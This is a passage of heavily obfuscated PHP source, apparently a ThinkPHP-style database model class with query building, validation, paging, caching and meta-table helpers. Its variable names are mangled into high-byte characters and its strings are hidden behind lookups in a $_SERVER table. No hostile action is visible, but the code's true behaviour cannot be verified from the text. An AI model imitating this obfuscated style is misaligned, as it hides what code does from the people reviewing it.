array_unshift($Æ Œ£Ôƒ, $ÛæšÊ˜[$”¹ôµşÛ[0]]); } if ($Á²»˜Ö«[397] == $”¹ôµşÛ[4]) { return call_user_func_array($”¹ôµşÛ[1], $Æ Œ£Ôƒ); } else { return call_user_func_array(array(&$this, $”¹ôµşÛ[1]), $Æ Œ£Ôƒ); } case $Á²»˜Ö«[405]: return $ÛæšÊ˜[$”¹ôµşÛ[0]] == $ÛæšÊ˜[$”¹ôµşÛ[1]]; case $Á²»˜Ö«[406]: if (is_string($”¹ôµşÛ[0]) && strpos($”¹ôµşÛ[0], $Á²»˜Ö«[50])) { $”¹ôµşÛ[0] = explode($Á²»˜Ö«[50], $”¹ôµşÛ[0]); } $ŒŸŠœ÷ = array(); if (is_array($”¹ôµşÛ[0])) { foreach ($”¹ôµşÛ[0] as $Âº¾ÃÁ) { $ŒŸŠœ÷[$Âº¾ÃÁ] = $ÛæšÊ˜[$Âº¾ÃÁ]; } } else { $ŒŸŠœ÷[$”¹ôµşÛ[0]] = $ÛæšÊ˜[$”¹ôµşÛ[0]]; } if (!empty($ÛæšÊ˜[$this->getPk()])) { $ŒŸŠœ÷[$this->getPk()] = array($Á²»˜Ö«[407], $ÛæšÊ˜[$this->getPk()]); } if ($this->where($ŒŸŠœ÷)->find()) { return !1; } return !0; default: return $this->check($ÛæšÊ˜[$”¹ôµşÛ[0]], $”¹ôµşÛ[1], $”¹ôµşÛ[4]); } } public function check($¿Êßµ¿, $ß®„íŸ, $ÅìÖ÷Ê = "\x72\145\x67\145\170") { $ÔÄâÓú =& $_SERVER[ˆ¡¹µ‹Â]; $ÅìÖ÷Ê = strtolower(trim($ÅìÖ÷Ê)); switch ($ÅìÖ÷Ê) { case $ÔÄâÓú[7]: case $ÔÄâÓú[408]: $±º”À´¶ = is_array($ß®„íŸ) ? $ß®„íŸ : explode($ÔÄâÓú[50], $ß®„íŸ); return $ÅìÖ÷Ê == $ÔÄâÓú[7] ? in_array($¿Êßµ¿, $±º”À´¶) : !in_array($¿Êßµ¿, $±º”À´¶); case $ÔÄâÓú[409]: case $ÔÄâÓú[410]: if (is_array($ß®„íŸ)) { $„üÖÜ›´ = $ß®„íŸ[0]; $Ì¹ø°ˆ‡ = $ß®„íŸ[1]; } else { list($„üÖÜ›´, $Ì¹ø°ˆ‡) = explode($ÔÄâÓú[50], $ß®„íŸ); } return $ÅìÖ÷Ê == $ÔÄâÓú[409] ? $¿Êßµ¿ >= $„üÖÜ›´ && $¿Êßµ¿ <= $Ì¹ø°ˆ‡ : $¿Êßµ¿ < $„üÖÜ›´ || $¿Êßµ¿ > $Ì¹ø°ˆ‡; case $ÔÄâÓú[411]: case $ÔÄâÓú[412]: return $ÅìÖ÷Ê == $ÔÄâÓú[411] ? $¿Êßµ¿ == $ß®„íŸ : $¿Êßµ¿ != $ß®„íŸ; case $ÔÄâÓú[413]: $¥…–³ô = mb_strlen($¿Êßµ¿, $ÔÄâÓú[414]); if (strpos($ß®„íŸ, $ÔÄâÓú[50])) { list($„üÖÜ›´, $Ì¹ø°ˆ‡) = explode($ÔÄâÓú[50], $ß®„íŸ); return $¥…–³ô >= $„üÖÜ›´ && $¥…–³ô <= $Ì¹ø°ˆ‡; } else { return $¥…–³ô == $ß®„íŸ; } case $ÔÄâÓú[415]: list($êÈ‹ı¯³, $ãŒÓ²¦Å) = explode($ÔÄâÓú[50], $ß®„íŸ); if (!is_numeric($êÈ‹ı¯³)) { $êÈ‹ı¯³ = strtotime($êÈ‹ı¯³); } if (!is_numeric($ãŒÓ²¦Å)) { $ãŒÓ²¦Å = strtotime($ãŒÓ²¦Å); } return NOW_TIME >= $êÈ‹ı¯³ && NOW_TIME <= $ãŒÓ²¦Å; case $ÔÄâÓú[416]: return in_array(get_client_ip(), explode($ÔÄâÓú[50], $ß®„íŸ)); case $ÔÄâÓú[417]: return !in_array(get_client_ip(), explode($ÔÄâÓú[50], $ß®„íŸ)); case $ÔÄâÓú[404]: default: return $this->regex($¿Êßµ¿, $ß®„íŸ); } } public function query($¢²ç„º, $ŞÛÇÏá = false) { $•‚­ßƒß =& $_SERVER[ˆ¡¹µ‹Â]; if (!is_bool($ŞÛÇÏá) && !is_array($ŞÛÇÏá)) { $ŞÛÇÏá = func_get_args(); array_shift($ŞÛÇÏá); } $¢²ç„º = str_replace(array($•‚­ßƒß[262], $•‚­ßƒß[418]), $•‚­ßƒß[53], $¢²ç„º); $¢²ç„º = $this->parseSql($¢²ç„º, $ŞÛÇÏá); return $this->db->query($¢²ç„º); } public function execute($î˜×õ½, $€ü¥Ú¤í = false) { if (!is_bool($€ü¥Ú¤í) && !is_array($€ü¥Ú¤í)) { $€ü¥Ú¤í = func_get_args(); array_shift($€ü¥Ú¤í); } $î˜×õ½ = $this->parseSql($î˜×õ½, $€ü¥Ú¤í); return $this->db->execute($î˜×õ½); } protected function parseSql($ÜÖÕÆßş, $Ø´ÍÅ…À) { $†ôŞœÍÅ =& $_SERVER[ˆ¡¹µ‹Â]; if (!0 === $Ø´ÍÅ…À) { $–«ªİ¾Ã = $this->_parseOptions(); $ÜÖÕÆßş = $this->db->parseSql($ÜÖÕÆßş, $–«ªİ¾Ã); } elseif (is_array($Ø´ÍÅ…À)) { $Ø´ÍÅ…À = array_map(array($this->db, $†ôŞœÍÅ[419]), $Ø´ÍÅ…À); $ÜÖÕÆßş = vsprintf($ÜÖÕÆßş, $Ø´ÍÅ…À); } else { $ÜÖÕÆßş = strtr($ÜÖÕÆßş, array($†ôŞœÍÅ[420] => $this->getTableName(), $†ôŞœÍÅ[421] => think_config($†ôŞœÍÅ[321]))); } $this->db->setModel($this->name); return $ÜÖÕÆßş; } public function db($ŒÁÖ”¥¨ = '', $È†œ…Ç› = '', $¶õäìâş = array()) { $è“¤Ö¡Õ =& $_SERVER[ˆ¡¹µ‹Â]; if ($è“¤Ö¡Õ[12] === $ŒÁÖ”¥¨ && $this->db) { return $this->db; } static $´•ùş©Ş = array(); static $Û¥©Ù‡† = array(); if (!isset($Û¥©Ù‡†[$ŒÁÖ”¥¨]) || isset($Û¥©Ù‡†[$ŒÁÖ”¥¨]) && $È†œ…Ç› && $´•ùş©Ş[$ŒÁÖ”¥¨] != $È†œ…Ç›) { if (!empty($È†œ…Ç›) && is_string($È†œ…Ç›) && !1 === strpos($È†œ…Ç›, $è“¤Ö¡Õ[8])) { $È†œ…Ç› = think_config($È†œ…Ç›); } $ŒÁÖ”¥¨ = think_guid($È†œ…Ç›); $Û¥©Ù‡†[$ŒÁÖ”¥¨] = Db::getInstance($È†œ…Ç›); } elseif (NULL === $È†œ…Ç›) { $Û¥©Ù‡†[$ŒÁÖ”¥¨]->close(); unset($Û¥©Ù‡†[$ŒÁÖ”¥¨]); return; } if (!empty($¶õäìâş)) { if (is_string($¶õäìâş)) { parse_str($¶õäìâş, $¶õäìâş); } foreach ($¶õäìâş as $›’ƒÎÈø => $ÎµŸ›·¨) { $this->setProperty($›’ƒÎÈø, $ÎµŸ›·¨); } } $´•ùş©Ş[$ŒÁÖ”¥¨] = $È†œ…Ç›; $this->db = $Û¥©Ù‡†[$ŒÁÖ”¥¨]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ü†¥ê‡ƒ = get_class($this); if ($ü†¥ê‡ƒ == $_SERVER[ˆ¡¹µ‹Â][422]) { return $this->name; } $this->name = substr($ü†¥ê‡ƒ, 0, -5); } return $this->name; } public function getTableName() { $’õ§—Ú‹ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($this->trueTableName)) { $¡ì·ÚïÃ = !empty($this->tablePrefix) ? $this->tablePrefix : $’õ§—Ú‹[12]; if (!empty($this->tableName)) { $¡ì·ÚïÃ .= $this->tableName; } else { $¡ì·ÚïÃ .= think_parse_name($this->name); } $this->trueTableName = strtolower($¡ì·ÚïÃ); } return (!empty($this->dbName) ? $this->dbName . $’õ§—Ú‹[10] : $’õ§—Ú‹[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÏÇ×ÕÈ³ =& $_SERVER[ˆ¡¹µ‹Â]; return isset($this->fields[$ÏÇ×ÕÈ³[328]]) ? $this->fields[$ÏÇ×ÕÈ³[328]] : $this->pk; } public function getDbFields() { $Ü’£°ş¹ =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($this->options[$Ü’£°ş¹[356]])) { $Ü‘’¬¨Ş = $this->db->getFields($this->options[$Ü’£°ş¹[356]]); return $Ü‘’¬¨Ş ? array_keys($Ü‘’¬¨Ş) : !1; } if ($this->fields) { $Ü‘’¬¨Ş = $this->fields; unset($Ü‘’¬¨Ş[$Ü’£°ş¹[327]], $Ü‘’¬¨Ş[$Ü’£°ş¹[328]], $Ü‘’¬¨Ş[$Ü’£°ş¹[329]], $Ü‘’¬¨Ş[$Ü’£°ş¹[326]]); return $Ü‘’¬¨Ş; } return !1; } public function data($­Ä³Àµƒ = '') { $ğ·À–°Å =& $_SERVER[ˆ¡¹µ‹Â]; if ($ğ·À–°Å[12] === $­Ä³Àµƒ && !empty($this->data)) { return $this->data; } if (is_object($­Ä³Àµƒ)) { $­Ä³Àµƒ = get_object_vars($­Ä³Àµƒ); } elseif (is_string($­Ä³Àµƒ)) { parse_str($­Ä³Àµƒ, $­Ä³Àµƒ); } elseif (!is_array($­Ä³Àµƒ)) { think_exception(think_lang($ğ·À–°Å[348])); } $this->data = $­Ä³Àµƒ; return $this; } public function join($ÒšªĞÃ) { $³Êçå‘ =& $_SERVER[ˆ¡¹µ‹Â]; if (is_array($ÒšªĞÃ)) { $this->options[$³Êçå‘[359]] = $ÒšªĞÃ; } elseif (!empty($ÒšªĞÃ)) { $this->options[$³Êçå‘[359]][] = $ÒšªĞÃ; } return $this; } public function union($†ò›‘„ì, $ËŒè­Ó = false) { $Šï³Ğëõ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($†ò›‘„ì)) { return $this; } if ($ËŒè­Ó) { $this->options[$Šï³Ğëõ[423]][$Šï³Ğëõ[424]] = !0; } if (is_object($†ò›‘„ì)) { $†ò›‘„ì = get_object_vars($†ò›‘„ì); } if (is_string($†ò›‘„ì)) { $’ù…’Óƒ = $†ò›‘„ì; } elseif (is_array($†ò›‘„ì)) { if (isset($†ò›‘„ì[0])) { $this->options[$Šï³Ğëõ[423]] = array_merge($this->options[$Šï³Ğëõ[423]], $†ò›‘„ì); return $this; } else { $’ù…’Óƒ = $†ò›‘„ì; } } else { think_exception(think_lang($Šï³Ğëõ[348])); } $this->options[$Šï³Ğëõ[423]][] = $’ù…’Óƒ; return $this; } public function cache($ù¬»‡ = true, $÷¥î›¹í = null, $È”§¿ß® = '') { $İˆ”ÏÕ¼ =& $_SERVER[ˆ¡¹µ‹Â]; if (!1 !== $ù¬»‡) { $this->options[$İˆ”ÏÕ¼[425]] = array($İˆ”ÏÕ¼[97] => $ù¬»‡, $İˆ”ÏÕ¼[415] => $÷¥î›¹í, $İˆ”ÏÕ¼[33] => $È”§¿ß®); } return $this; } public function field($ÎßòïÁœ, $€éå¯ƒ® = false) { $œ¦Ğ‹½­ =& $_SERVER[ˆ¡¹µ‹Â]; if (!0 === $ÎßòïÁœ) { $á²ï®Ëı = $this->getDbFields(); $ÎßòïÁœ = $á²ï®Ëı ? $á²ï®Ëı : $œ¦Ğ‹½­[220]; } elseif ($€éå¯ƒ®) { if (is_string($ÎßòïÁœ)) { $ÎßòïÁœ = explode($œ¦Ğ‹½­[50], $ÎßòïÁœ); } $á²ï®Ëı = $this->getDbFields(); $ÎßòïÁœ = $á²ï®Ëı ? array_diff($á²ï®Ëı, $ÎßòïÁœ) : $ÎßòïÁœ; } $this->options[$œ¦Ğ‹½­[350]] = $ÎßòïÁœ; return $this; } public function scope($›ƒãÍ”ƒ = '', $ò»÷ªÜß = NULL) { $Ã—ŸÍ© =& $_SERVER[ˆ¡¹µ‹Â]; if ($Ã—ŸÍ©[12] === $›ƒãÍ”ƒ) { if (isset($this->_scope[$Ã—ŸÍ©[37]])) { $ÎÚãú = $this->_scope[$Ã—ŸÍ©[37]]; } else { return $this; } } elseif (is_string($›ƒãÍ”ƒ)) { $Ú‡ÙÄ÷˜ = explode($Ã—ŸÍ©[50], $›ƒãÍ”ƒ); $ÎÚãú = array(); foreach ($Ú‡ÙÄ÷˜ as $— û„) { if (!isset($this->_scope[$— û„])) { continue; } $ÎÚãú = array_merge($ÎÚãú, $this->_scope[$— û„]); } if (!empty($ò»÷ªÜß) && is_array($ò»÷ªÜß)) { $ÎÚãú = array_merge($ÎÚãú, $ò»÷ªÜß); } } elseif (is_array($›ƒãÍ”ƒ)) { $ÎÚãú = $›ƒãÍ”ƒ; } if (is_array($ÎÚãú) && !empty($ÎÚãú)) { $this->options = array_merge($this->options, array_change_key_case($ÎÚãú)); } return $this; } public function where($¥½Ş…ğæ, $ Âïï— = null) { $¢¸şêâ  =& $_SERVER[ˆ¡¹µ‹Â]; if (!is_null($ Âïï—) && is_string($¥½Ş…ğæ)) { if (!is_array($ Âïï—)) { $ Âïï— = func_get_args(); array_shift($ Âïï—); } $ Âïï— = array_map(array($this->db, $¢¸şêâ [419]), $ Âïï—); $¥½Ş…ğæ = vsprintf($¥½Ş…ğæ, $ Âïï—); } elseif (is_object($¥½Ş…ğæ)) { $¥½Ş…ğæ = get_object_vars($¥½Ş…ğæ); } elseif (is_array($¥½Ş…ğæ)) { foreach ($¥½Ş…ğæ as $•ÚîçÏº => $­äïª†Å) { if ((is_numeric($•ÚîçÏº) || !$•ÚîçÏº) && is_string($­äïª†Å)) { if (strpos($­äïª†Å, $¢¸şêâ [426]) === 0) { continue; } think_trace($¢¸şêâ [427], $¢¸şêâ [12], $¢¸şêâ [49]); die; } } } if (is_string($¥½Ş…ğæ) && $¢¸şêâ [12] != $¥½Ş…ğæ) { $™óòæÈá = array(); $™óòæÈá[$¢¸şêâ [428]] = $¥½Ş…ğæ; $¥½Ş…ğæ = $™óòæÈá; } if (isset($this->options[$¢¸şêâ [352]])) { $this->options[$¢¸şêâ [352]] = array_merge($this->options[$¢¸şêâ [352]], $¥½Ş…ğæ); } else { $this->options[$¢¸şêâ [352]] = $¥½Ş…ğæ; } return $this; } public function limit($¹µ¹†ä, $èÏß§Œ× = null) { $íô í¢Ë =& $_SERVER[ˆ¡¹µ‹Â]; $this->options[$íô í¢Ë[368]] = is_null($èÏß§Œ×) ? $¹µ¹†ä : $¹µ¹†ä . $íô í¢Ë[50] . $èÏß§Œ×; return $this; } public function page($Ë«‰ßÚ”, $¯²’ôîš = null) { $‹•‡©¯º =& $_SERVER[ˆ¡¹µ‹Â]; $this->options[$‹•‡©¯º[429]] = is_null($¯²’ôîš) ? $Ë«‰ßÚ” : $Ë«‰ßÚ” . $‹•‡©¯º[50] . $¯²’ôîš; return $this; } public function comment($ë¨ˆ¢±) { $this->options[$_SERVER[ˆ¡¹µ‹Â][430]] = $ë¨ˆ¢±; return $this; } public function setProperty($¨İ¥…±, $—áÜ¢à) { if (property_exists($this, $¨İ¥…±)) { $this->{$¨İ¥…±} = $—áÜ¢à; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\146\x79\124\x69\155\145", "\x74\x69\x6d\x65", "\x69\x6e\x73\x65\162\x74\54\165\160\144\141\164\145", "\x66\165\156\x63\164\151\157\x6e"), array("\x63\x72\x65\x61\x74\145\x54\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\x73\145\x72\164", "\x66\165\156\x63\164\151\157\156")); public function setDataAuto($ãíğèÏÛ) { $this->dataAuto = $ãíğèÏÛ; } public function __construct($ÃÙî«ù— = '', $¨§³¿¸Ã = '', $¼­æıÍÔ = '') { parent::__construct($ÃÙî«ù—, $¨§³¿¸Ã, $¼­æıÍÔ); } protected $tableMeta = array(); protected function _beforeInsert(&$„šßÀÕ³, $Ä­§¯¦) { $®†ß˜¸ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->checkDataAutoHas($®†ß˜¸[431])) { return; } $this->dataBeforeFilter($„šßÀÕ³, $®†ß˜¸[431]); } protected function _beforeUpdate(&$ñûçÅ¡Õ, $œ¹Í¿Ú) { $÷çÈ±­à =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->checkDataAutoHas($÷çÈ±­à[432])) { return; } $this->dataBeforeFilter($ñûçÅ¡Õ, $÷çÈ±­à[432]); } protected function _afterSelect(&$‰úğ†–, $‹­óØ¦¥) { if (!is_array($‰úğ†–)) { return; } if (!$this->checkDataAutoHas($_SERVER[ˆ¡¹µ‹Â][433])) { return; } foreach ($‰úğ†– as &$ÃÙ‹Şîë) { $this->dataAfterFilter($ÃÙ‹Şîë); } unset($ÃÙ‹Şîë); } protected function _afterFind(&$¯ê·©ê, $ŠşøâƒÈ) { if (!is_array($¯ê·©ê)) { return; } if (!$this->checkDataAutoHas($_SERVER[ˆ¡¹µ‹Â][433])) { return; } $this->dataAfterFilter($¯ê·©ê); } public static function textEncode($Í§ÎŒÓ‘) { if (!$Í§ÎŒÓ‘) { return $Í§ÎŒÓ‘; } $£¬Ó‰Ç = json_encode($Í§ÎŒÓ‘); $£¬Ó‰Ç = preg_replace_callback($_SERVER[ˆ¡¹µ‹Â][434], function ($·˜”Ùîä) { return addslashes($·˜”Ùîä[0]); }, $£¬Ó‰Ç); return json_decode($£¬Ó‰Ç); } public static function textDecode($âÂ—†Œ) { $Ì¹´î¥È =& $_SERVER[ˆ¡¹µ‹Â]; $íã€ËêÚ = json_encode($âÂ—†Œ); $íã€ËêÚ = preg_replace_callback($Ì¹´î¥È[435], function ($˜ôàôöü) { return $_SERVER[ˆ¡¹µ‹Â][100]; }, $íã€ËêÚ); return json_decode($íã€ËêÚ); } public function setAutoIncrement($ÑˆşÉËò) { $µ¤Â‘­ = array($this->getPk() => $ÑˆşÉËò); $é°¡©ß¯ = $this->data($µ¤Â‘­)->add(); if ($é°¡©ß¯) { $this->delete($é°¡©ß¯); } } public function getAutoIncrement() { $êæ¥ãü = $this->getTableName(); $ƒÏ¡àú = $this->max($this->getPk()); $ÌóØ©íæ = $this->query("\163\150\x6f\x77\40\164\141\x62\x6c\x65\x20\x73\164\141\x74\x75\163\x20\x77\150\x65\x72\145\x20\x4e\141\155\145\75\x27{$êæ¥ãü}\47"); $îåÅƒ†¬ = $ÌóØ©íæ[0][$_SERVER[ˆ¡¹µ‹Â][436]]; $Áêø˜ÀÈ = max($ƒÏ¡àú, $îåÅƒ†¬); return $Áêø˜ÀÈ; } protected function _callBefore($ğÍ¦Ğ§–, $ãö¶µ¸) { return $this->cacheCallCheck($ğÍ¦Ğ§–, $ãö¶µ¸, !1); } protected function _callAfter($Êªéõú, $È×¢ÆØ) { return $this->cacheCallCheck($Êªéõú, $È×¢ÆØ, !0); } protected function cacheFunctionAlias($¹ª®›£ë) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÜÓı­§ß, $º©ÃºÏ¼, $·Èüöıø = false) { $²ƒ´¤–İ = $this->cacheFunctionAlias($º©ÃºÏ¼); if (!$²ƒ´¤–İ) { return; } foreach ($²ƒ´¤–İ as $¢¹Ô™¡Í => $×Ó”Îş¯) { $‡ÍŒ£Ø = $×Ó”Îş¯[0]; $í—ˆ‹Ã€ = explode($_SERVER[ˆ¡¹µ‹Â][50], $×Ó”Îş¯[1]); if ($ÜÓı­§ß == $¢¹Ô™¡Í) { return $this->cacheFunctionGet($¢¹Ô™¡Í, $‡ÍŒ£Ø); } if ($·Èüöıø && in_array($ÜÓı­§ß, $í—ˆ‹Ã€)) { $this->cacheFunctionClear($¢¹Ô™¡Í, $‡ÍŒ£Ø); } } } public function cacheFunctionGet($Ö¬øïˆÒ, $ñ‚©Œşş) { $×˜ñÑ–» = $this->cacheKeyMake($Ö¬øïˆÒ, $ñ‚©Œşş); $‰€‘ß½ = Cache::get($×˜ñÑ–»); if (!is_array($‰€‘ß½)) { $‰€‘ß½ = call_user_func_array(array($this, $Ö¬øïˆÒ), array($ñ‚©Œşş, !0)); Cache::set($×˜ñÑ–», $‰€‘ß½); } return $‰€‘ß½; } public function cacheFunctionClear($í²‚¿Ëø, $¨”ÕÍí) { $è÷—òº = $¨”ÕÍí; if (!is_array($¨”ÕÍí)) { $è÷—òº = array($¨”ÕÍí); } foreach ($è÷—òº as $ğ¬áÜ) { $³Œ±’ö¡ = $this->cacheKeyMake($í²‚¿Ëø, $ğ¬áÜ); Cache::remove($³Œ±’ö¡); } } private function cacheKeyMake($šï†™¾, $Ó™øé÷Ü) { $ù×­Şœ =& $_SERVER[ˆ¡¹µ‹Â]; return get_class($this) . $ù×­Şœ[11] . $šï†™¾ . $ù×­Şœ[437] . $Ó™øé÷Ü; } protected function selectPageReset() { $ß„ìß‚ =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($GLOBALS[$ß„ìß‚[438]])) { return; } $GLOBALS[$ß„ìß‚[438]] = isset($GLOBALS[$ß„ìß‚[7]][$ß„ìß‚[439]]) ? $GLOBALS[$ß„ìß‚[7]][$ß„ìß‚[439]] : !1; $GLOBALS[$ß„ìß‚[440]] = isset($GLOBALS[$ß„ìß‚[7]][$ß„ìß‚[429]]) ? $GLOBALS[$ß„ìß‚[7]][$ß„ìß‚[429]] : !1; $GLOBALS[$ß„ìß‚[7]][$ß„ìß‚[439]] = !1; $GLOBALS[$ß„ìß‚[7]][$ß„ìß‚[429]] = !1; } protected function selectPageRestore() { $œ¼òåÛ’ =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($GLOBALS[$œ¼òåÛ’[438]])) { return; } $GLOBALS[$œ¼òåÛ’[7]][$œ¼òåÛ’[439]] = $GLOBALS[$œ¼òåÛ’[438]]; $GLOBALS[$œ¼òåÛ’[7]][$œ¼òåÛ’[429]] = $GLOBALS[$œ¼òåÛ’[440]]; if ($GLOBALS[$œ¼òåÛ’[7]][$œ¼òåÛ’[439]] === !1) { unset($GLOBALS[$œ¼òåÛ’[7]][$œ¼òåÛ’[439]]); } if ($GLOBALS[$œ¼òåÛ’[7]][$œ¼òåÛ’[429]] === !1) { unset($GLOBALS[$œ¼òåÛ’[7]][$œ¼òåÛ’[429]]); } unset($GLOBALS[$œ¼òåÛ’[438]]); unset($GLOBALS[$œ¼òåÛ’[440]]); } protected function selectPage($…ñØóïê = 200, $½ñ€²Ø€ = 1) { $ÍûÔ‘Š… =& $_SERVER[ˆ¡¹µ‹Â]; global $in; $²õ›ÒåÈ = $this->optionsValue(); $ëÈú¢™¯ = 50000; $…ñØóïê = isset($in[$ÍûÔ‘Š…[439]]) && $in[$ÍûÔ‘Š…[439]] ? $in[$ÍûÔ‘Š…[439]] : $…ñØóïê; if ($…ñØóïê === -1) { $in[$ÍûÔ‘Š…[439]] = !1; $ëÈú¢™¯ = 100000000; $…ñØóïê = $ëÈú¢™¯; } $¸…›˜á© = $²õ›ÒåÈ; $¸…›˜á©[$ÍûÔ‘Š…[441]] = array(); $…ñØóïê = intval($…ñØóïê); $…ñØóïê = $…ñØóïê <= 5 ? 5 : ($…ñØóïê >= $ëÈú¢™¯ ? $ëÈú¢™¯ : $…ñØóïê); $½ñ€²Ø€ = intval(isset($in[$ÍûÔ‘Š…[429]]) && $in[$ÍûÔ‘Š…[429]] ? $in[$ÍûÔ‘Š…[429]] : $½ñ€²Ø€); $½ñ€²Ø€ = $½ñ€²Ø€ <= 1 ? 1 : $½ñ€²Ø€; $®âŞŒ¨â = array(); $¦ÑÓÑñŒ = 1; if ($½ñ€²Ø€ == 1 && $¦ÑÓÑñŒ) { $this->optionsValue($²õ›ÒåÈ); $®âŞŒ¨â = $this->page($½ñ€²Ø€, $…ñØóïê)->select(); $Úã™á·Û = is_array($®âŞŒ¨â) ? count($®âŞŒ¨â) : 0; if ($Úã™á·Û < $…ñØóïê) { $±äï¼Ìí = 1; } else { $this->optionsValue($¸…›˜á©); $Úã™á·Û = intval($this->count()); $±äï¼Ìí = ceil($Úã™á·Û / $…ñØóïê); } } else { $this->optionsValue($¸…›˜á©); $Úã™á·Û = intval($this->count()); $±äï¼Ìí = ceil($Úã™á·Û / $…ñØóïê); $½ñ€²Ø€ = $½ñ€²Ø€ >= $±äï¼Ìí ? $±äï¼Ìí : $½ñ€²Ø€; $this->optionsValue($²õ›ÒåÈ); $®âŞŒ¨â = $this->page($½ñ€²Ø€, $…ñØóïê)->select(); } if (!is_array($®âŞŒ¨â)) { $®âŞŒ¨â = array(); } if ($±äï¼Ìí == 1) { $Úã™á·Û = count($®âŞŒ¨â); } $ïıì¡ïŞ = array($ÍûÔ‘Š…[442] => array($ÍûÔ‘Š…[443] => $Úã™á·Û, $ÍûÔ‘Š…[439] => $…ñØóïê, $ÍûÔ‘Š…[429] => $½ñ€²Ø€, $ÍûÔ‘Š…[444] => $±äï¼Ìí), $ÍûÔ‘Š…[445] => $®âŞŒ¨â); return $ïıì¡ïŞ; } protected function checkLength($Ì‰¿œË†, $‘¼ãÑÏÔ = 0, $Ä³è©·ƒ = '') { $éòÆ¬Š =& $_SERVER[ˆ¡¹µ‹Â]; $‘¼ãÑÏÔ = $‘¼ãÑÏÔ ? $‘¼ãÑÏÔ : 65536; if (!$Ì‰¿œË† || strlen($Ì‰¿œË†) < $‘¼ãÑÏÔ) { return; } $Ä³è©·ƒ = $Ä³è©·ƒ ? $Ä³è©·ƒ . $éòÆ¬Š[74] : $éòÆ¬Š[12]; show_json($Ä³è©·ƒ . LNG($éòÆ¬Š[446]) . "\50{$‘¼ãÑÏÔ}\x29", !1); } protected function metaSet($ö›ÃùÂİ, $ÎŸÍÓ = null, $³¼çğÏš = null) { $¦ıÎàæ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->tableMeta || !$ö›ÃùÂİ) { return !1; } $¬ùÄÂå¶ = $this->tableMeta[$¦ıÎàæ[447]]; $óñó° = $this->tableMeta[$¦ıÎàæ[448]]; $›·ò¡— = Model($óñó°); $ù‰¡§Ñ² = array($¬ùÄÂå¶ => $ö›ÃùÂİ, $¦ıÎàæ[449] => $ÎŸÍÓ); if (is_null($ÎŸÍÓ)) { return $›·ò¡—->where(array($¬ùÄÂå¶ => $ö›ÃùÂİ))->delete(); } if (is_null($³¼çğÏš) && is_string($ÎŸÍÓ)) { return $›·ò¡—->where($ù‰¡§Ñ²)->delete(); } $áäî•ñê = is_array($ÎŸÍÓ) ? $ÎŸÍÓ : array(); if (is_string($ÎŸÍÓ)) { $áäî•ñê[$ÎŸÍÓ] = $³¼çğÏš; } $Îûûø’ = array(); foreach ($áäî•ñê as $ óöÖÄì => $•Ù½³æ) { if (is_null($•Ù½³æ) && is_string($ óöÖÄì)) { $›·ò¡—->where(array($¬ùÄÂå¶ => $ö›ÃùÂİ, $¦ıÎàæ[449] => $ óöÖÄì))->delete(); continue; } $this->checkLength($•Ù½³æ, !1, $óñó° . $¦ıÎàæ[4] . $ óöÖÄì); $Îûûø’[] = array($¬ùÄÂå¶ => $ö›ÃùÂİ, $¦ıÎàæ[97] => $ óöÖÄì, $¦ıÎàæ[450] => $•Ù½³æ); } $¥ĞõÄ†“ = $¦ıÎàæ[451] . $óñó°; CacheLock::lock($¥ĞõÄ†“); $›·ò¡—->where(array($¬ùÄÂå¶ => $ö›ÃùÂİ))->addAll($Îûûø’, array(), !0); CacheLock::unlock($¥ĞõÄ†“); return !0; } public function metaGet($á”¶Š¨ , $¢Ğˆö©÷ = false) { $Ã”¥Œ¬ñ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->tableMeta) { return array(); } $™”ç–…Á = $this->tableMeta[$Ã”¥Œ¬ñ[447]]; $üÓİÑê• = Model($this->tableMeta[$Ã”¥Œ¬ñ[448]]); if ($¢Ğˆö©÷) { $äí¢ÔÛ‹ = array($™”ç–…Á => $á”¶Š¨ , $Ã”¥Œ¬ñ[97] => $¢Ğˆö©÷); return $üÓİÑê•->where($äí¢ÔÛ‹)->getField($Ã”¥Œ¬ñ[450]); } $äí¢ÔÛ‹ = array($™”ç–…Á => $á”¶Š¨ ); $êù•«ìë = $üÓİÑê•->field($Ã”¥Œ¬ñ[452])->where($äí¢ÔÛ‹)->select(); $êù•«ìë = array_to_keyvalue($êù•«ìë, $Ã”¥Œ¬ñ[97], $Ã”¥Œ¬ñ[450]); return $êù•«ìë; } private function checkDataAutoHas($¾µ÷Íª¾) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¨’î×í‰) { if (in_array($¾µ÷Íª¾, explode($_SERVER[ˆ¡¹µ‹Â][50], $¨’î×í‰[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¾Ëèªî¥, $ôé¤±ƒ‰) { $ƒü©Ÿè’ =& $_SERVER[ˆ¡¹µ‹Â]; if (!is_array($¾Ëèªî¥)) { return; } foreach ($this->dataAuto as $òàà¬ûì) { $Óè€ÏÄ = $òàà¬ûì[0]; if (!in_array($ôé¤±ƒ‰, explode($ƒü©Ÿè’[50], $òàà¬ûì[2]))) { continue; } switch (trim($òàà¬ûì[3])) { case $ƒü©Ÿè’[397]: case $ƒü©Ÿè’[398]: $¦àĞ¯¸ù = $òàà¬ûì[1]; $óçÛå‚„ = isset($òàà¬ûì[4]) ? (array) $òàà¬ûì[4] : array(); if ($¦àĞ¯¸ù == $ƒü©Ÿè’[206] && array_key_exists($Óè€ÏÄ, 